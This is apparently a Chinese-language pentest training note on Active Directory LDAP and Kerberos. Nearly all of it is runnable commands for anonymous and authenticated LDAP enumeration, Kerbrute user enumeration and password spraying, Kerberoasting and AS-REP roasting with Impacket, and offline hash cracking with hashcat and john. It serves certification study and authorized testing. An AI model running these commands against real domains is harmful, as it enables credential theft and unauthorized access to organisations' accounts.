# 第 53 章 - LDAP 與 Kerberos 基礎

## 標籤

- #cpts
- #chapter
- #ldap
- #kerberos
- #ad
- #services

## 學習目標

- 理解 LDAP 與 Kerberos 在企業身分基礎設施中的角色。
- 能用 ldapsearch 進行匿名與憑證式查詢。
- 能從 Kerberos 服務提取 Kerberoastable 帳號與 AS-REP Roastable 帳號。
- 知道哪些列舉結果屬於架構資訊，哪些可能構成風險。
- 將基礎服務結果轉成後續 AD/身份攻擊面方向。

---

## 理論基礎

```text
LDAP（Lightweight Directory Access Protocol）：
  Port: 389/tcp（明文）、636/tcp（LDAPS 加密）
        3268/tcp（Global Catalog）、3269/tcp（Global Catalog SSL）
  用途：查詢 Active Directory 中的使用者、群組、電腦、OU、GPO 等物件

Kerberos：
  Port: 88/tcp+udp
  用途：AD 網域的身份認證協定，替代 NTLM
  關鍵概念：
    KDC（Key Distribution Center）= Domain Controller
    TGT（Ticket Granting Ticket）= 初始憑票
    TGS（Ticket Granting Service）= 服務憑票
    SPN（Service Principal Name）= 服務識別名稱

攻擊面：
  匿名 LDAP 查詢 → 洩漏網域結構、命名慣例、使用者列表
  Kerberoasting → 取得服務帳號的 TGS hash（需要任意 AD 使用者）
  AS-REP Roasting → 不需密碼取得不要求預先認證帳號的 hash
  Kerbrute 使用者枚舉 → 無需憑證驗證帳號是否存在
```

---

## 方法一：服務發現

```bash
# 掃描 LDAP 與 Kerberos 相關埠
nmap -sV -p 88,389,636,3268,3269 TARGET_IP
# 88  → Kerberos
# 389 → LDAP
# 636 → LDAPS（加密 LDAP）
# 3268 → Global Catalog LDAP
# 3269 → Global Catalog LDAPS

# 嘗試列舉 rootDSE（匿名查詢 AD 基本資訊）
nmap --script ldap-rootdse -p 389 TARGET_IP
# rootDSE → 目錄根，通常允許匿名讀取
# 可得：defaultNamingContext / namingContexts / supportedSASLMechanisms

# 取得網域命名上下文（從 rootDSE 或 ldapsearch）
ldapsearch -x -H ldap://TARGET_IP -s base namingcontexts
# -x → 匿名（Simple Authentication，無需 SASL）
# -H → 指定 LDAP server URI
# -s base → 只查詢根目錄（不遞迴）
# namingcontexts → 要查詢的屬性
```

---

## 方法二：匿名 LDAP 查詢

```bash
# 嘗試匿名查詢整個目錄（若伺服器允許）
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=com"
# -b → 指定搜尋基礎 DN（Distinguished Name）
# 若回傳物件 → 匿名讀取未限制，高價值情報

# 查詢所有使用者
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=com" \
  "(objectClass=user)" sAMAccountName userPrincipalName
# (objectClass=user) → 過濾條件：只要 user 物件
# sAMAccountName → 登入名稱
# userPrincipalName → UPN（email 格式的帳號）

# 查詢所有群組
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=com" \
  "(objectClass=group)" cn member
# cn → 群組名稱
# member → 群組成員 DN

# 查詢所有電腦
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=com" \
  "(objectClass=computer)" cn dNSHostName operatingSystem
# dNSHostName → FQDN
# operatingSystem → 作業系統版本
```

---

## 方法三：憑證式 LDAP 查詢

```bash
# 取得使用者憑證後，進行完整枚舉
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=com" \
  -D "CN=user,CN=Users,DC=domain,DC=com" -w "PASSWORD" \
  "(objectClass=user)" sAMAccountName description memberOf
# -D → Bind DN（你的帳號完整 DN）
# -w → 密碼
# description → 有時含密碼（Legacy 設定）
# memberOf → 使用者所屬群組

# 找出有描述欄的帳號（常有弱點或密碼線索）
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=com" \
  -D "CN=user,CN=Users,DC=domain,DC=com" -w "PASSWORD" \
  "(&(objectClass=user)(description=*))" sAMAccountName description

# 查詢特權群組成員（Domain Admins / Enterprise Admins）
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=com" \
  -D "CN=user,CN=Users,DC=domain,DC=com" -w "PASSWORD" \
  "(&(objectClass=group)(cn=Domain Admins))" member

# 找出有 SPN 的帳號（Kerberoasting 目標）
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=com" \
  -D "CN=user,CN=Users,DC=domain,DC=com" -w "PASSWORD" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# 找出不要求預先認證的帳號（AS-REP Roasting 目標）
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=com" \
  -D "CN=user,CN=Users,DC=domain,DC=com" -w "PASSWORD" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
# userAccountControl bit 23 (4194304) = DONT_REQUIRE_PREAUTH
```

---

## 方法四：Kerberos 使用者枚舉

```bash
# Kerbrute 使用者枚舉（無需憑證，依賴 KDC 回應差異）
kerbrute userenum --dc TARGET_IP -d domain.com /usr/share/seclists/Usernames/top-usernames-shortlist.txt
# userenum → 枚舉模式
# --dc → Domain Controller IP
# -d → 網域名稱
# 回應 VALID 代表帳號存在；回應 INVALID 代表不存在

# 大型字典
kerbrute userenum --dc TARGET_IP -d domain.com \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -t 20
# -t 20 → 20 個執行緒（預設 10）

# 密碼噴灑（Kerbrute，避免帳號鎖定）
kerbrute passwordspray --dc TARGET_IP -d domain.com users.txt 'Password123'
# 一個密碼對所有使用者，不會鎖定（因為只嘗試一次）
```

---

## 方法五：Kerberoasting（取得服務帳號 Hash）

```bash
# 前提：需要任意一個有效 AD 帳號（哪怕是低權限）

# Impacket GetUserSPNs.py → 請求有 SPN 的服務帳號 TGS
GetUserSPNs.py domain.com/user:password -dc-ip TARGET_IP
# 列出所有 SPN 帳號

# 直接請求並輸出 hash（hashcat 可直接破解）
GetUserSPNs.py domain.com/user:password -dc-ip TARGET_IP -request
# 輸出 $krb5tgs$23$... 格式的 hash

# 指定輸出到檔案
GetUserSPNs.py domain.com/user:password -dc-ip TARGET_IP -request -outputfile kerberoast.hashes

# hashcat 破解 Kerberoast hash
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
# -m 13100 → Kerberos 5 TGS-REP etype 23 (RC4)

# john 破解
john kerberoast.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 方法六：AS-REP Roasting（不需密碼取得 Hash）

```bash
# 前提：目標帳號設定了「不要求 Kerberos 預先認證」

# 不需憑證（帳號名稱已知）
GetNPUsers.py domain.com/ -dc-ip TARGET_IP -usersfile users.txt -format hashcat -outputfile asrep.hashes
# -usersfile → 帳號名稱列表（kerbrute 枚舉結果）
# -format hashcat → 輸出 hashcat 可用格式
# 對存在且不要求預先認證的帳號，KDC 會回傳 AS-REP hash

# 有憑證（自動發現所有脆弱帳號）
GetNPUsers.py domain.com/user:password -dc-ip TARGET_IP -format hashcat -outputfile asrep.hashes
# 不需要 -usersfile，直接查 LDAP 找所有脆弱帳號

# hashcat 破解 AS-REP hash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
# -m 18200 → Kerberos 5 AS-REP etype 23

# john 破解
john asrep.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 決策流程

```
nmap -p 88,389,636 確認服務
    ↓
嘗試匿名 LDAP 查詢（ldapsearch -x -b "DC=..."）
  → 成功：列舉使用者 / 群組 / 電腦 / SPN
  → 失敗：需要憑證
    ↓
無憑證 → Kerbrute 枚舉有效帳號
有憑證 → 完整 ldapsearch 查詢
    ↓
找到帳號列表？
  → Kerberoasting（GetUserSPNs.py -request）→ hashcat -m 13100
  → AS-REP Roasting（GetNPUsers.py -usersfile）→ hashcat -m 18200
    ↓
破解成功 → 取得服務帳號或使用者密碼 → 進入 AD 攻擊
```

---

## 速查表

```bash
# 服務掃描
nmap -sV -p 88,389,636,3268,3269 TARGET_IP
nmap --script ldap-rootdse -p 389 TARGET_IP

# 匿名 LDAP 查詢
ldapsearch -x -H ldap://TARGET_IP -s base namingcontexts
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName

# 憑證式查詢
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=com" \
  -D "CN=user,CN=Users,DC=domain,DC=com" -w "PASS" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Kerbrute 枚舉
kerbrute userenum --dc TARGET_IP -d domain.com users.txt

# Kerberoasting
GetUserSPNs.py domain.com/user:pass -dc-ip TARGET_IP -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt rockyou.txt

# AS-REP Roasting
GetNPUsers.py domain.com/ -dc-ip TARGET_IP -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

---

## 常見錯誤與排查

- 把服務存在直接寫成弱點 — 需確認匿名查詢範圍或配置缺陷才算 finding。
- Kerberoasting 需要 AD 帳號，無帳號先走 AS-REP Roasting 或 Kerbrute。
- ldapsearch 的 `-b` DN 要符合目標網域，錯誤 DN 會回傳空結果。
- AS-REP hash 格式 `-m 18200` 不同於 Kerberoast `-m 13100`，不要搞錯。

---

## 關聯筆記

- [[45-SMB|第 45 章 - SMB]]
- [[05-Volume-5-Common-Services-Index|Vol.5 - Attacking Common Services]]
- `Vol.9 - Active Directory Enumeration and Attacks`
